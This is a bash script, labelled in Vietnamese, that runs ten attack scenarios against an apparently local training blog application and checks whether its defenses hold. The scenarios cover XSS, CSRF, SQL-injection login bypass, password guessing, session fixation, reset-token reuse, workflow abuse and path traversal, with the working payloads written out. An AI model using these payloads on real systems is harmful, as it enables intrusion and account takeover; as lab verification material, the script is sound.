#!/usr/bin/env bash
set -u

BASE_URL="${BASE_URL:-http://localhost:8080}"
CASE="${1:-}"
TMP_DIR="$(mktemp -d)"
JAR="$TMP_DIR/cookies.txt"
trap 'rm -rf "$TMP_DIR"' EXIT

html_csrf() {
    sed -n 's/.*name="_csrf" value="\([^"]*\)".*/\1/p' | head -1
}

login() {
    local user="$1"
    local pass="$2"
    local html token
    html="$(curl -sS -c "$JAR" "$BASE_URL/login")"
    token="$(printf '%s' "$html" | html_csrf)"
    curl -sS -b "$JAR" -c "$JAR" \
        --data-urlencode "username=$user" \
        --data-urlencode "password=$pass" \
        --data-urlencode "_csrf=$token" \
        -o "$TMP_DIR/login.html" -w 'đăng nhập: %{http_code}\n' "$BASE_URL/login"
}

mode() {
    echo "không xác định"
}

case "$CASE" in
01)
    echo "Kịch bản 1: Stored XSS"
    login bien 'Bien@Lab#2026'
    payload="<script>alert('stored-demo')</script>"
    curl -sS -b "$JAR" -c "$JAR" "$BASE_URL/post?id=1" -o "$TMP_DIR/post-before.html"
    token="$(html_csrf < "$TMP_DIR/post-before.html")"
    curl -sS -b "$JAR" -c "$JAR" \
        --data-urlencode "post_id=1" \
        --data-urlencode "body=$payload" \
        --data-urlencode "_csrf=$token" \
        -o /dev/null -w 'gửi bình luận: %{http_code}\n' "$BASE_URL/comment"
    curl -sS "$BASE_URL/post?id=1" -o "$TMP_DIR/post.html"
    grep -o "stored-demo" "$TMP_DIR/post.html" | head -1
    grep -o "&lt;script&gt;alert[^<]*" "$TMP_DIR/post.html" | head -1
    ;;
02)
    echo "Kịch bản 2: Reflected XSS"
    payload="<script>alert('reflected-demo')</script>"
    curl -sS -G --data-urlencode "q=$payload" "$BASE_URL/search" -o "$TMP_DIR/search.html"
    grep -o "reflected-demo" "$TMP_DIR/search.html" | head -1
    grep -o "&lt;script&gt;alert[^<]*" "$TMP_DIR/search.html" | head -1
    ;;
03)
    echo "Kịch bản 3: DOM-based XSS"
    curl -sS "$BASE_URL/demo/dom" -o "$TMP_DIR/dom.html"
    script="$(grep -o 'dom-[a-z]*\.js' "$TMP_DIR/dom.html" | head -1)"
    echo "Tệp script: $script"
    curl -sS "$BASE_URL/assets/$script" | grep -E "innerHTML|textContent" | head -1
    echo "Mở trình duyệt tại: $BASE_URL/demo/dom?q=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27dom-demo%27%29%3E"
    ;;
04)
    echo "Kịch bản 4: CSRF đổi email"
    login bien 'Bien@Lab#2026'
    curl -sS -b "$JAR" -c "$JAR" \
        --data-urlencode "email=attacker@lab.local" \
        -o "$TMP_DIR/csrf.html" -w 'gửi không mã CSRF: %{http_code}\n' "$BASE_URL/account/email"
    curl -sS -b "$JAR" "$BASE_URL/account" | grep -o 'value="[^"]*@lab.local"' | head -1
    echo "Trang mô phỏng: http://localhost:8088/"
    ;;
05)
    echo "Kịch bản 5: SQL Injection"
    html="$(curl -sS -c "$JAR" "$BASE_URL/login")"
    token="$(printf '%s' "$html" | html_csrf)"
    curl -sS -i -b "$JAR" -c "$JAR" \
        --data-urlencode "username=' OR '1'='1' -- " \
        --data-urlencode "password=khong-quan-trong" \
        --data-urlencode "_csrf=$token" \
        "$BASE_URL/login" -o "$TMP_DIR/sqli.txt"
    head -1 "$TMP_DIR/sqli.txt"
    grep -E '^Location:' "$TMP_DIR/sqli.txt" || true
    ;;
06)
    echo "Kịch bản 6: Vét cạn mật khẩu"
    html="$(curl -sS -c "$JAR" "$BASE_URL/login")"
    token="$(printf '%s' "$html" | html_csrf)"
    for i in 1 2 3 4 5; do
        curl -sS -b "$JAR" -c "$JAR" \
            --data-urlencode "username=minh" \
            --data-urlencode "password=sai-$i" \
            --data-urlencode "_csrf=$token" \
            -o /dev/null -w "lần $i: %{http_code}\n" "$BASE_URL/login"
    done
    curl -sS -b "$JAR" -c "$JAR" \
        --data-urlencode "username=minh" \
        --data-urlencode "password=Minh@Lab#2026" \
        --data-urlencode "_csrf=$token" \
        -o "$TMP_DIR/brute.html" -w 'đăng nhập đúng sau khóa: %{http_code}\n' "$BASE_URL/login"
    grep -o 'tạm khóa[^<]*' "$TMP_DIR/brute.html" | head -1
    ;;
07)
    echo "Kịch bản 7: Cố định và phát lại phiên"
    sid="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
    curl -sS -i -c "$JAR" -H "Cookie: ATUDBLOG_SID=$sid" "$BASE_URL/login" -o "$TMP_DIR/get.txt"
    token="$(html_csrf < "$TMP_DIR/get.txt")"
    curl -sS -i -b "$JAR" -c "$JAR" -H "Cookie: ATUDBLOG_SID=$sid" \
        --data-urlencode "username=minh" \
        --data-urlencode "password=Minh@Lab#2026" \
        --data-urlencode "_csrf=$token" "$BASE_URL/login" -o "$TMP_DIR/login.txt"
    grep -i '^Set-Cookie:' "$TMP_DIR/login.txt" || echo "Không đổi mã phiên sau đăng nhập"
    curl -sS -H "Cookie: ATUDBLOG_SID=$sid" "$BASE_URL/account" -o /dev/null -w 'phát lại trước đăng xuất: %{http_code}\n'
    curl -sS -H "Cookie: ATUDBLOG_SID=$sid" "$BASE_URL/logout" -o /dev/null -w 'đăng xuất: %{http_code}\n'
    curl -sS -H "Cookie: ATUDBLOG_SID=$sid" "$BASE_URL/account" -o /dev/null -w 'phát lại sau đăng xuất: %{http_code}\n'
    ;;
08)
    echo "Kịch bản 8: Đặt lại mật khẩu"
    html="$(curl -sS -c "$JAR" "$BASE_URL/forgot")"
    token="$(printf '%s' "$html" | html_csrf)"
    curl -sS -b "$JAR" -c "$JAR" \
        --data-urlencode "email=ngoc@lab.local" \
        --data-urlencode "_csrf=$token" "$BASE_URL/forgot" -o "$TMP_DIR/forgot.html"
    link="$(grep -o '/reset?token=[^"]*' "$TMP_DIR/forgot.html" | head -1)"
    if [ -n "$link" ]; then
        echo "Liên kết: $link"
    else
        echo "Liên kết được ghi trong storage/logs/mail.log"
        link="/reset?token=$(tail -1 app/storage/logs/mail.log | sed -n 's/.*token=\([a-f0-9]*\).*/\1/p')"
    fi
    curl -sS -b "$JAR" "$BASE_URL$link" -o "$TMP_DIR/reset.html"
    token2="$(html_csrf < "$TMP_DIR/reset.html")"
    reset_token="$(printf '%s' "$link" | sed -n 's/.*token=\([^&]*\).*/\1/p')"
    curl -sS -b "$JAR" -c "$JAR" \
        --data-urlencode "token=$reset_token" \
        --data-urlencode "password=Ngoc@Lab2026Moi" \
        --data-urlencode "confirm=Ngoc@Lab2026Moi" \
        --data-urlencode "_csrf=$token2" \
        -o /dev/null -w 'đặt lại lần một: %{http_code}\n' "$BASE_URL/reset"
    curl -sS -b "$JAR" "$BASE_URL$link" -o "$TMP_DIR/reuse.html" -w 'mở lại liên kết: %{http_code}\n'
    grep -o 'không hợp lệ[^<]*' "$TMP_DIR/reuse.html" | head -1
    ;;
09)
    echo "Kịch bản 9: Lạm dụng quy trình xuất bản"
    login lan 'Lan@Lab#2026'
    curl -sS -b "$JAR" "$BASE_URL/editor/edit?id=5" -o "$TMP_DIR/edit.html"
    token="$(html_csrf < "$TMP_DIR/edit.html")"
    curl -sS -b "$JAR" -c "$JAR" \
        --data-urlencode "id=5" \
        --data-urlencode "title=Ghi chu ky thuat ve quy trinh xuat ban" \
        --data-urlencode "summary=Ban nhap" \
        --data-urlencode "body=Noi dung bai viet nhap du dai de kiem tra quy trinh." \
        --data-urlencode "status=published" \
        --data-urlencode "_csrf=$token" \
        -o "$TMP_DIR/workflow.html" -w 'gửi trạng thái xuất bản: %{http_code}\n' "$BASE_URL/editor/save"
    grep -o 'Trạng thái không được phép' "$TMP_DIR/workflow.html" | head -1
    ;;
10)
    echo "Kịch bản 10: Duyệt đường dẫn"
    curl -sS "$BASE_URL/download?file=../private/demo-secret.txt" -o "$TMP_DIR/traversal.txt" -w 'yêu cầu duyệt: %{http_code}\n'
    head -2 "$TMP_DIR/traversal.txt"
    curl -sS "$BASE_URL/download?id=2" -o /dev/null -w 'tệp công khai: %{http_code} (%{size_download} byte)\n'
    ;;
*)
    echo "Cách dùng: BASE_URL=http://localhost:8080 bash scripts/kiem-chung-web.sh <01..10>"
    echo "Chế độ hiện tại: $(mode)"
    exit 1
    ;;
esac
